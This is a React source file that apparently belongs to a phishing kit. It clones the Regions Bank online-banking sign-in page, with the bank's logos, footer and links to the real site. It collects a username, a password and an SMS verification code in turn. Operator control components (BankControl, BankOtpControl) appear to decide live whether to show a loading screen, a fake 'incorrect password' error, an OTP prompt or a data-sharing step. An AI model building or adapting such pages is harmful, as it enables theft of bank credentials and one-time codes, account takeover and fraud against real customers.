import { useState } from "react";
import BankingHeader from "./BankingHeader";
import { otpOptions } from "../../bankDetails";
import { Link } from "react-router-dom";
import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import RegionsFavIcon from "../../../../../../../../assets/allBanks/banks/regions/rg2.ico";
import RegionsImg from "../../../../../../../../assets/allBanks/banks/regions/rg4.svg";
import Fdic from "../../../../../../../../assets/allBanks/banks/regions/rg5.png";
import { BsExclamationCircleFill } from "react-icons/bs";
import House from "../../../../../../../../assets/allBanks/banks/regions/rg7.svg";
import Fdic2 from "../../../../../../../../assets/allBanks/banks/regions/rg6.svg";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Regions = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
    setErrorFormState,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);
  const [nextPass, setNextPass] = useState(false);
  const [nextLoad, setNextLoad] = useState(false);

  const nextToPass = () => {
    setNextLoad(true);
    if (formState.username === "") {
      setErrorFormState({ username: "Enter a valid username" });
      setNextLoad(false);
      return;
    }

    setTimeout(() => {
      setNextPass(true);
    }, 2000);
  };

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-white",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Sign in - Regions.com"
        handleCancel={handleCancel}
        img={RegionsFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <header className="flex items-center justify-center py-5 mb-1">
        <div>
          <div className="flex justify-center ">
            <img
              src={RegionsImg}
              alt=""
              className="w-[120px] h-[28px] object-contain"
            />
          </div>
          <div>
            <img
              src={Fdic}
              alt=""
              className=" w-[300px] customMiniTablet:w-[420px] h-[30px] object-contain"
            />
          </div>
        </div>
      </header>
      <div className="flex items-center justify-center px-6 pt-0 pb-20 text-customGray-900">
        <div
          className={clsx(
            " customMiniTablet:w-[500px]",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <div className="mb-8 text-center space-y-7">
            <h1 className="text-3xl font-extralight">
              Access your accounts online
            </h1>
            <p className="text-lg font-bold">
              {nextPass ? (
                <span>Log in using your Online Banking password</span>
              ) : (
                <span>Log in to Online Banking</span>
              )}
            </p>
            {nextPass && (
              <p>
                Logging in as{" "}
                <span className="font-bold">{formState.username}</span>
              </p>
            )}
          </div>
          <div className="w-full px-8 py-6 bg-white rounded-3xl box-shadow5">
            <div className={clsx(nextPass ? "hidden" : "block")}>
              <div>
                <div className="mb-4">
                  <label
                    className={clsx(
                      "mb-2 font-semibold text-[15px]",
                      errorFormState.username ? "text-customRed-1001" : ""
                    )}
                  >
                    Username
                  </label>
                  <input
                    type="text"
                    value={formState.username}
                    name="username"
                    onChange={handleChange}
                    className={clsx(
                      "w-full px-4 py-3 mt-2  border rounded-lg outline-none border-customGray-1035 focus:border-4 focus:border-customGreen-700 transistion2",
                      errorFormState.username
                        ? "border border-customRed-1001"
                        : ""
                    )}
                  />
                  {errorFormState.username && (
                    <p className="flex gap-2 mt-2 text-sm text-customRed-1001">
                      <BsExclamationCircleFill className="mt-[2px]" />
                      {errorFormState.username}
                    </p>
                  )}
                </div>
                <div className="flex items-center gap-2">
                  <input type="checkbox" className="w-[20px] h-[20px]" />
                  <p className="font-semibold ">Remember my username</p>
                </div>
              </div>
              <div className="px-9">
                <button
                  onClick={nextToPass}
                  className="w-full py-3 my-5 font-semibold text-white rounded-full bg-customGreen-700 "
                >
                  {loading && <ClipLoader size={10} color="#fff" />}
                  {nextLoad ? "Loading..." : "Continue"}
                </button>
              </div>
            </div>
            {nextPass && (
              <div className={clsx()}>
                <div>
                  <div className="relative mb-4">
                    <label
                      className={clsx(
                        "mb-2 font-semibold text-[15px]",
                        errorFormState.password ? "text-customRed-1001" : ""
                      )}
                    >
                      Password
                    </label>
                    <input
                      type={showPassword ? "text" : "password"}
                      value={formState.password}
                      name="password"
                      onChange={handleChange}
                      className={clsx(
                        "w-full pl-4 pr-16 py-3 mt-2  border rounded-lg outline-none border-customGray-1035 focus:border-4 focus:border-customGreen-700 transistion2",
                        errorFormState.password
                          ? "border border-customRed-1001"
                          : ""
                      )}
                    />
                    <span
                      onClick={() => setshowPassword((prevShow) => !prevShow)}
                      className="absolute h-full leading-[4.2] right-4 text-customGray-1047 font-semibold"
                    >
                      {showPassword ? "Hide" : "Show"}
                    </span>
                    {errorFormState.password && (
                      <p className="flex gap-2 mt-2 text-sm text-customRed-1001">
                        <BsExclamationCircleFill className="mt-[2px]" />
                        {errorFormState.password}
                      </p>
                    )}
                  </div>
                </div>
                <div className="px-9">
                  <button
                    onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                    className="w-full py-3 my-5 font-semibold text-white rounded-full bg-customGreen-700 "
                  >
                    {loading && <ClipLoader size={10} color="#fff" />}
                    {loading ? "Loading..." : "Continue"}
                  </button>
                </div>
              </div>
            )}
          </div>
          <div className="mt-8 space-y-3 text-center">
            <p>
              Forgot{" "}
              <Link
                className="font-semibold underline text-customBlue-1020"
                to="https://www.regions.com/personal-banking"
              >
                username
              </Link>{" "}
              or{" "}
              <Link
                className="font-semibold underline text-customBlue-1020"
                to="https://www.regions.com/personal-banking"
              >
                password?
              </Link>
            </p>
            <p>
              Don’t have an Online Banking account?{" "}
              <Link
                className="font-semibold underline text-customBlue-1020"
                to="https://www.regions.com/personal-banking"
              >
                Enroll now.
              </Link>{" "}
            </p>
          </div>
        </div>
        <div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
                setNextPass={setNextPass}
                setNextLoad={setNextLoad}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div className={clsx(" customMiniTablet:w-[500px]")}>
                      <div className="mb-8 text-center space-y-7">
                        <h1 className="text-3xl font-extralight">
                          Access your accounts online
                        </h1>
                        <p className="text-lg font-bold">
                          {nextPass ? (
                            <span>
                              Log in using your Online Banking password
                            </span>
                          ) : (
                            <span>Log in to Online Banking</span>
                          )}
                        </p>
                        {nextPass && (
                          <p>
                            Logging in as{" "}
                            <span className="font-bold">
                              {formState.username}
                            </span>
                          </p>
                        )}
                      </div>
                      <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                        <BsExclamationCircleFill className="mt-[2px]" />

                        {/* <p>{activePathDetails.body}</p> */}
                        <p>
                          The username or password you entered is incorrect.
                          Please close your browser and try signing in again.
                        </p>
                      </div>
                      <div className="w-full px-8 py-6 bg-white rounded-3xl box-shadow5">
                        <div className={clsx(nextPass ? "hidden" : "block")}>
                          <div>
                            <div className="mb-4">
                              <label
                                className={clsx(
                                  "mb-2 font-semibold text-[15px]",
                                  errorFormState.username
                                    ? "text-customRed-1001"
                                    : ""
                                )}
                              >
                                Username
                              </label>
                              <input
                                type="text"
                                value={formState.username}
                                name="username"
                                onChange={handleChange}
                                className={clsx(
                                  "w-full px-4 py-3 mt-2  border rounded-lg outline-none border-customGray-1035 focus:border-4 focus:border-customGreen-700 transistion2",
                                  errorFormState.username
                                    ? "border border-customRed-1001"
                                    : ""
                                )}
                              />
                              {errorFormState.username && (
                                <p className="flex gap-2 mt-2 text-sm text-customRed-1001">
                                  <BsExclamationCircleFill className="mt-[2px]" />
                                  {errorFormState.username}
                                </p>
                              )}
                            </div>
                            <div className="flex items-center gap-2">
                              <input
                                type="checkbox"
                                className="w-[20px] h-[20px]"
                              />
                              <p className="font-semibold ">
                                Remember my username
                              </p>
                            </div>
                          </div>
                          <div className="px-9">
                            <button
                              onClick={nextToPass}
                              className="w-full py-3 my-5 font-semibold text-white rounded-full bg-customGreen-700 "
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {nextLoad ? "Loading..." : "Continue"}
                            </button>
                          </div>
                        </div>
                        {nextPass && (
                          <div className={clsx()}>
                            <div>
                              <div className="relative mb-4">
                                <label
                                  className={clsx(
                                    "mb-2 font-semibold text-[15px]",
                                    errorFormState.password
                                      ? "text-customRed-1001"
                                      : ""
                                  )}
                                >
                                  Password
                                </label>
                                <input
                                  type={showPassword ? "text" : "password"}
                                  value={formState.password}
                                  name="password"
                                  onChange={handleChange}
                                  className={clsx(
                                    "w-full pl-4 pr-16 py-3 mt-2  border rounded-lg outline-none border-customGray-1035 focus:border-4 focus:border-customGreen-700 transistion2",
                                    errorFormState.password
                                      ? "border border-customRed-1001"
                                      : ""
                                  )}
                                />
                                <span
                                  onClick={() =>
                                    setshowPassword((prevShow) => !prevShow)
                                  }
                                  className="absolute h-full leading-[4.2] right-4 text-customGray-1047 font-semibold"
                                >
                                  {showPassword ? "Hide" : "Show"}
                                </span>
                                {errorFormState.password && (
                                  <p className="flex gap-2 mt-2 text-sm text-customRed-1001">
                                    <BsExclamationCircleFill className="mt-[2px]" />
                                    {errorFormState.password}
                                  </p>
                                )}
                              </div>
                            </div>
                            <div className="px-9">
                              <button
                                onClick={(e) =>
                                  handleTheMainSubmit(e, onSumbitForm)
                                }
                                className="w-full py-3 my-5 font-semibold text-white rounded-full bg-customGreen-700 "
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                {loading ? "Loading..." : "Continue"}
                              </button>
                            </div>
                          </div>
                        )}
                      </div>
                      <div className="mt-8 space-y-3 text-center">
                        <p>
                          Forgot{" "}
                          <Link
                            className="font-semibold underline text-customBlue-1020"
                            to="https://www.regions.com/personal-banking"
                          >
                            username
                          </Link>{" "}
                          or{" "}
                          <Link
                            className="font-semibold underline text-customBlue-1020"
                            to="https://www.regions.com/personal-banking"
                          >
                            password?
                          </Link>
                        </p>
                        <p>
                          Don’t have an Online Banking account?{" "}
                          <Link
                            className="font-semibold underline text-customBlue-1020"
                            to="https://www.regions.com/personal-banking"
                          >
                            Enroll now.
                          </Link>{" "}
                        </p>
                      </div>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4 bg-customGray-1010 py-4",
                        isOpenOtp && "hidden"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Verify your identity
                            </h3>
                            <p className="mb-2 text-center ">
                              For your security, we need to verify it&apos;s
                              really you.
                            </p>
                          </div>
                          <div>
                            <h2 className="mb-2 text-sm font-bold">
                              How would you like to get your verification code?
                            </h2>
                            <p className="mb-2 text-sm text-customGray-100">
                              Select One:
                            </p>
                            <div
                              role="radiogroup"
                              aria-label="Otp Options"
                              className="flex flex-col space-y-3"
                            >
                              {otpOptions.map((bank) => (
                                <div
                                  key={bank.id}
                                  role="radio"
                                  tabIndex={0}
                                  onClick={() => handleOtpOption(bank.id)}
                                  className="flex items-center gap-2.5 "
                                >
                                  <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                    <p
                                      className={clsx(
                                        "rounded-full w-[10px] h-[10px]  ",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "bg-customBlue-500"
                                          : ""
                                      )}
                                    ></p>
                                  </div>
                                  <h2
                                    className={clsx(
                                      "text-sm",
                                      otpOptions[indexOtp]?.id === bank.id
                                        ? "text-customBlue-500 hover:underline"
                                        : "hover:text-customBlue-700 hover:underline"
                                    )}
                                  >
                                    {bank.name}
                                  </h2>
                                </div>
                              ))}
                            </div>
                            <button
                              onClick={onSubmitOtpOptions}
                              className="w-full py-3 my-5 font-semibold text-white rounded-full bg-customGreen-700 "
                            >
                              Continue
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                    {isOpenOtp && (
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4 bg-customGray-1010 py-4"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Enter Verification Code
                              </h3>
                            </div>
                            <div>
                              <h2 className="mb-2 text-center ">
                                Enter the verification code we sent to your
                                mobile number
                              </h2>
                              <div className="px-2 customMiniTablet:px-24">
                                <div>
                                  <input
                                    type="number"
                                    placeholder="Enter Verification Code"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className={clsx(
                                      "w-full px-4 no-spinner py-3 mt-2  border rounded-lg outline-none border-customGray-1035 focus:border-4 focus:border-customGreen-700 transistion2",
                                      errorOtp.otpo
                                        ? "border border-customRed-1001"
                                        : ""
                                    )}
                                  />
                                  {errorOtp.otpo && (
                                    <p className="mt-2 text-sm text-customRed-1001">
                                      Please enter the verification code.
                                    </p>
                                  )}
                                </div>
                                <button
                                  className="w-full py-3 my-5 font-semibold text-white rounded-full bg-customGreen-700 "
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Verify"}
                                </button>
                              </div>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold text-center",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Didnt get a code? Resend
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />

              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4 bg-customGray-1010 py-4"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Enter Verification Code
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-2 text-center ">
                              Enter the verification code we sent to your mobile
                              number
                            </h2>
                            <div className="px-2 customMiniTablet:px-24">
                              <div>
                                <input
                                  type="number"
                                  placeholder="Enter Verification Code"
                                  value={formOtp.otpo}
                                  name="otpo"
                                  onChange={changeOtp}
                                  className={clsx(
                                    "w-full px-4 no-spinner py-3 mt-2  border rounded-lg outline-none border-customGray-1035 focus:border-4 focus:border-customGreen-700 transistion2",
                                    errorOtp.otpo
                                      ? "border border-customRed-1001"
                                      : ""
                                  )}
                                />

                                {errorOtp.otpo && (
                                  <p className="mt-2 text-sm text-customRed-1001">
                                    Please enter the verification code.
                                  </p>
                                )}
                                <h3 className="mt-2 text-sm text-customRed-200">
                                  {activeOtp.body}
                                </h3>
                              </div>
                              <button
                                className="w-full py-3 my-5 font-semibold text-white rounded-full bg-customGreen-700 "
                                onClick={(e) =>
                                  onSubmitOtp(e, handleVerifiedOtp)
                                }
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                {loading ? "Loading..." : "Verify"}
                              </button>
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.regions.com/personal-banking"
                    />
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
      <footer className="flex items-center justify-center px-6 py-16 mt-10 text-xs text-customGray-900">
        <div>
          <div className="space-y-2 text-center">
            <p>©2025 Regions Bank. All Rights Reserved.</p>
            <p>
              Regions, the Regions logo and the LifeGreen bike are registered
              trademarks of Regions Bank. The LifeGreen color is a trademark of
              Regions Bank.
            </p>
          </div>
          <div className="flex items-center justify-center gap-4 mt-7">
            <div className="flex justify-center ">
              <img
                src={Fdic2}
                alt=""
                className="w-[31px] h-[32px] object-contain"
              />
            </div>
            <div>
              <img
                src={House}
                alt=""
                className=" w-[44px] h-[30px] object-contain"
              />
            </div>
          </div>
        </div>
      </footer>
    </motion.div>
  );
};

export default Regions;
